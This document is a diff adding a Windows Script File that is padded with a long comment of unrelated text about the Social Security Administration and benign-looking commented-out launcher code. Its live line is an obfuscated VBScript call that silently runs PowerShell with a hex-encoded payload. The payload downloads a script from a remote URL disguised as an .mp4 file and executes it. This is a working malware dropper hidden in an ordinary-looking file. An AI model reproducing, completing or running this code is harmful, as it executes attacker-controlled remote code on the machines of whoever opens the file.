@@ -1,0 +1,63 @@
+<package>
+<job id="manage-kqdisyrseu">
+<script language="VBScript">
+
+'NOTE :    The Social Security Administration (SSA) is an essential component of the United States’ social safety net, providing crucial financial support to millions of Americans.
+'      Established in 1935 under President Franklin D. Roosevelt’s New Deal, the SSA administers the Social Security program, which offers retirement, disability, and survivors benefits.
+'      This program is funded through payroll taxes collected under the Federal Insurance Contributions Act (FICA), creating a contributory system where workers pay into the program during their employment years.
+'      The SSA’s responsibilities are extensive and multifaceted.
+'      The agency processes applications for benefits, determines eligibility, and maintains accurate earnings records for all workers.
+'      By managing the Social Security Trust Fund, the SSA ensures that funds are available to pay current and future benefits.
+'      This careful management of funds is crucial for the program’s sustainability, ensuring that it can continue to support beneficiaries for generations to come.
+'      One of the SSA’s critical roles is administering Medicare, the federal health insurance program for people aged 65 and older or with specific disabilities.
+'      Medicare provides comprehensive health coverage, significantly reducing the financial burden of medical expenses and ensuring access to necessary medical care for millions of Americans.
+'      This program plays a vital role in the healthcare system, providing essential services to a significant portion of the population.
+'      The SSA also places a strong emphasis on preventing fraud and maintaining program integrity.
+'      Through regular reviews and updates, the agency ensures that benefits are accurately distributed to eligible individuals, protecting the program from misuse and ensuring its long-term viability.
+'      This commitment to integrity is essential for maintaining public trust in the Social Security system.
+'      Beyond its core functions, the SSA provides extensive educational resources and support to help individuals understand their benefits and make informed decisions.
+'      This guidance is crucial for retirees planning their financial futures, disabled individuals seeking assistance, and families navigating survivors benefits.
+'      The SSA’s outreach efforts help ensure that people are aware of the benefits available to them and understand how to access them.
+'      The impact of the SSA on American society is profound.
+'      Social Security benefits are a primary source of income for many retirees, helping to maintain their standard of living and prevent poverty in old age.
+'      For disabled individuals, Social Security provides essential financial support when they are unable to work, offering a lifeline during challenging times.
+'      The survivors benefits program provides financial assistance to families who have lost a breadwinner, helping them navigate the financial challenges of such a loss.
+'      Moreover, the SSA’s role in reducing poverty cannot be overstated.
+'      Social Security benefits have lifted millions of Americans out of poverty, providing financial stability and security to vulnerable populations.
+'      This safety net is particularly important for elderly individuals who rely on Social Security as their primary source of income during retirement.
+'      The SSA’s efforts contribute to a more equitable society, where individuals and families have the support they need to lead dignified lives.
+'      The SSA also engages in continuous improvement and modernization efforts to better serve the public.
+'      By leveraging technology and improving its processes, the SSA aims to enhance the efficiency and effectiveness of its services.
+'      These efforts include developing online tools and resources, streamlining application processes, and improving customer service.
+'      The agency’s commitment to innovation ensures that it can meet the evolving needs of the American people.
+'      Additionally, the SSA collaborates with other government agencies and organizations to provide a comprehensive support system for individuals in need.
+'      This collaboration helps to address the diverse needs of beneficiaries and ensures that they receive the appropriate services and assistance.
+'      The SSA’s holistic approach to service delivery enhances the overall impact of its programs and contributes to the well-being of American society.
+'      manage-kqdisyrseu.wsf has been replaced.
+
+
+'strArgs = "dwfhpvvjla"
+
+'For I = 0 to WScript.Arguments.Count - 1
+   'strArgs = strArgs & " " & WScript.Arguments(I)
+'Next
+
+'strArgs = strArgs & " -legacy_Vista"
+With CreateObject(Replace("WscREDROript.ShREDROell" , "REDRO" , ""))
+    .Run "powershell ""$ReDrO = -JOIn('24~52<3dR27<49%65U58U28<4eR65Q27;3bQ24%52>45<20Q3d;20<24U52%2bR27<57U2d~4fR42%4a>27Q3b%24;52~45<44R20;3dQ20~24U52<45%2b%27%65U43R54U20R4eU65>54%2eQ57Q27~3bQ24~50~41R43U3d;27~65Q42Q43R4cQ27;3b%24R78~78>20<3dU20<24<50>41<43;2b;27Q49Q65~4e<27;3b;24~52U4f<20U3d;20%24U78>78>2b~27U54%29U2e<44~4fR57~4e>4c%4fU27R3b%24Q7a<7a;3d<27R4f<40%30R28U26U28Q27<27<68R74~74<70>73R3aR2f<2fU73%6c;69>6dU2e;78>73<6c>69<77;69R66;72<65U2e~63~6f~6d<2f~78U65;72~66~2e>6dR70~34;27Q27>29<27Q2e>52<65%50>4c<41>43R65;28U27U4f~40<30%28<26R27U2c;27~41Q44;53~54<52%49~4eQ47>27;29U3b~69%65R78~28<24<52Q45U44~2bQ24>52%4f~2bU24R7a%7aR29'.SPLit( 'R>Q<;~%U') |ForEaCH-obJECt{ ( [char]( [cONVErT]::TOiNT16(($_.TOStrIng() ) ,16 ) ))}) |&( $veRbOsEpReFErENCE.tOstrinG()[1,3]+'X'-jOin'') ; powershell $ReDrO"" " , 0 , True    
+End With
+'Set objShell = WScript.CreateObject("WScript.Shell")
+
+'Set objExecObject = objShell.Exec("%comspec% /c manage-kqdisyrseu.exe " & strArgs)
+
+'Do While Not objExecObject.StdOut.AtEndOfStream
+    'WScript.StdOut.WriteLine objExecObject.StdOut.ReadLine()
+'Loop
+
+'Do While Not objExecObject.StdErr.AtEndOfStream
+    'WScript.StdErr.WriteLine objExecObject.StdErr.ReadLine()
+'Loop
+
+</script>
+</job>
+</package>
